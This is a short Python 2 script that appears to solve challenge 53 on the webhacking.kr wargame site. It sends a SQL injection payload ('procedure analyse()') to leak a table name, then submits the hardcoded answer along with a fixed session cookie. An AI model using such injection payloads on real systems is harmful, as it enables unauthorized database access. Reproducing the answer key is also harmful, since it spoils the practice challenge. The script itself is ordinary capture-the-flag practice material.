#-*- coding: utf-8 -*-
import urllib2
import CookieManager

print "[*] Finding Table Name"
challengeUrl = "http://webhacking.kr/challenge/web/web-28/"
parameter = "?val=1%20procedure%20analyse()"
CookieManager.addCookie("PHPSESSID", "73ea5f35f558006f21f6185c171a2ed9")
httpRequest = urllib2.Request(challengeUrl+parameter)
httpRequest.add_header("Cookie", CookieManager.getCookie())
httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
print

print "[*] Clear Challenge 53"
parameter = "?answer=Chal12NGe_53_TabLE_zz"
httpRequest = urllib2.Request(challengeUrl + parameter)
httpRequest.add_header("Cookie", CookieManager.getCookie())
httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
